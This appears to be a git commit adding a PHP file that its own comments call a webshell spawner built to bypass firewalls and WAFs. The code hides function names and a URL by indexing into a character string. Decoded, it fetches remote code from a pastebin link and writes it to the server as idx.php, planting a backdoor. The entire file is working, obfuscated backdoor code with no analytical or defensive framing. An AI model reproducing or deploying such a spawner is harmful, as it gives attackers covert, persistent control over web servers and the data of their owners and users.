79f8c9cedb8916e93133029ee6eb1cca408db1be
Abdi Prawira N <wearemasskill@outlook.com>
2019-03-08 14:43:38 +0700

    payloads folder

---
+++ lib/payloads/backdoor_spawner.php
@@ -0,0 +1,75 @@
+<?php
+$key 
+					/**
+						* @package Backdoor IDX Webshell Spawner (idx.php)
+							* Bypass Any WAF / Firewall 
+								* Bypass HTTP ERROR [ 403, 402 & etc... ] 
+									* @author Created by Ardzz 👍
+										* @link https://www.github.com/ardzz 
+											*/
+												=
+													(
+								   /*
+									    👍
+											👍                 👍 Created By Ardzz 👍
+												👍
+													*/
+	"0123456789abcdefghijklmnopqrstuvwxyz;`</>- |_=,.:ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+								   /*
+									    👍
+											👍                 👍 Created By Ardzz 👍
+												👍
+													*/
+																							);
+	(
+	$key[15].
+	$key[18].
+	$key[21].
+	$key[14].
+	$key[44].
+	$key[25].$key[30].
+	$key[29].$key[44].
+	$key[12].$key[24].
+	$key[23].
+	$key[29].
+	$key[14].
+	$key[23].
+	$key[29].
+	$key[28]
+	)
+	(
+		(
+			$key[18].
+			$key[13].
+			$key[33].$key[47].
+			$key[25].$key[17].$key[25]
+			), 
+		(
+			$key[15].
+			$key[18].
+			$key[21].
+			$key[14].$key[44].
+			$key[16].$key[14].
+			$key[29].$key[44].
+			$key[12].
+			$key[24].$key[23].$key[29].
+			$key[14].$key[23].$key[29].
+			$key[28]
+			)
+		(
+			(
+				$key[17].$key[29].
+				$key[29].$key[25].
+				$key[28].$key[48].
+				$key[39].$key[39].
+				$key[25].$key[10].$key[28].
+				$key[29].$key[14].$key[11].
+				$key[18].$key[23].$key[47].
+				$key[12].$key[24].$key[22].
+				$key[39].$key[27].$key[10].$key[32].
+				$key[39].$key[05].$key[72].$key[05].
+				$key[00].$key[12].$key[35].$key[74].$key[22]
+				)
+			)
+);
+?>
